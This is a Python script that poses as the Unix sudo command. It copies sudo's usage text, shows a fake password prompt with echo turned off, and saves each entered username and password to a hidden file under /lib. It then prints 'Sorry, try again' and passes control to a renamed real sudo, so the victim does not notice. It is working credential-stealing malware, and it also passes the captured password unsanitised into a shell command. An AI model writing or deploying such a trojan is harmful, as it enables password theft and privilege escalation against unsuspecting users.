import os
import subprocess
import sys
import getpass
import socket
import time

def main():
    if(len(sys.argv) == 1):
        print("""
        usage: sudo -h | -K | -k | -V
        usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
        usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
        usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
        usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
        """)
    else:
        user = getpass.getuser()
        
        os.system('stty -echo')
        sudoCommand = "[sudo] password for " + user + ": "
        password = input("[sudo] password for " + user + ": ")
        print()
        
        os.system("echo \"" + user + ":" + password + "\" >> /lib/.syslogbLog")
        time.sleep(3)
        os.system('stty echo')
        print("Sorry, try again.")
        print("\n")
        os.system("sudoA su")
main()